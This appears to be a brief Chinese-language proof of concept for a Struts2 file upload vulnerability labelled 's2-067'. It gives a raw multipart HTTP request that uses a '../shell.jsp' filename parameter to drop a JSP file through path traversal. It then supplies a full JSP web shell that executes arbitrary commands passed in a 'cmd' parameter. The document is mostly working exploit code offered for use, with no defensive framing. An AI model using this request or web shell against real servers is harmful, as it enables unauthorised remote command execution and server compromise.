# s2-067

## 请求报文
```Raw
POST /index.action HTTP/1.1
Host: ip:port
Content-Length: 335
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: text/plain

<%
  out.println("hello world");
%>
------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="top.fileFileName"

../shell.jsp
------WebKitFormBoundaryl6ZFZPznNSPZOFJF--

```
最后通过访问 **http://ip:8080/shell.jsp** 就可以看到页面输出"hello world"

如果需要更方便的进行RCE
```jsp
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"%>
<%@ page import="java.io.*, java.util.*"%>
<html>
<head>
    <title>Simple JSP WebShell</title>
</head>
<body>
    <h3>JSP WebShell</h3>
    <form method="get">
        <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
    <%
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.trim().isEmpty()) {
            try {

                Process process = Runtime.getRuntime().exec(cmd);

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    out.println(line + "<br>");
                }
                reader.close();
                process.waitFor();
            } catch (IOException | InterruptedException e) {
                out.println("Error: " + e.getMessage());
            }
        }
    %>
</body>
</html>

```
